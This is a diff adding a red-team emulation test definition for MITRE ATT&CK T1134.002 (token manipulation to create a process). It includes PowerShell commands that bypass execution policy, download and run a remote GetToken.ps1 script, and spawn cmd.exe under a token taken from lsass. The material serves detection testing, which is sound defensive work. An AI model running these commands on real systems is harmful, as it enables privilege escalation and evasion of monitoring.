@@ -1,0 +1,30 @@
+attack_technique: T1134.002
+display_name: "Create Process with Token"
+atomic_tests:
+- name: Access Token Manipulation
+  auto_generated_guid: dbf4f5a9-b8e0-46a3-9841-9ad71247239e
+  description: |
+    This action demonstrates how an access token for a specific program can spawn another program under a different owner. 
+    Adversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. 
+    This action will query all processes and list the process name and owner. It will then make a copy of an existing token to create a new instance of cmd.exe.
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      GetToken.ps1 script must exist at specified location (C:\AtomicTests\source\T1134.002\src\GetToken.ps1)
+    prereq_command: |
+      if (Test-Path "C:\AtomicTests\source\T1134.002\src\GetToken.ps1") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "C:\AtomicTests\source\T1134.002\src\GetToken.ps1") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.002/src/GetToken.ps1" -OutFile "C:\AtomicTests\source\T1134.002\src\GetToken.ps1"
+  executor:
+    command: |
+      Set-ExecutionPolicy -Scope Process Bypass -Force
+      $owners = @{}
+      gwmi win32_process | % {$owners[$_.handle] = $_.getowner().user}
+      Get-Process | Select-Object ProcessName, Id, @{Name="Owner"; Expression={$owners[$_.Id.tostring()]}}
+      & "C:\AtomicTests\source\T1134.002\src\GetToken.ps1"
+      [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id, "cmd.exe")
+    name: powershell
+    elevation_required: true
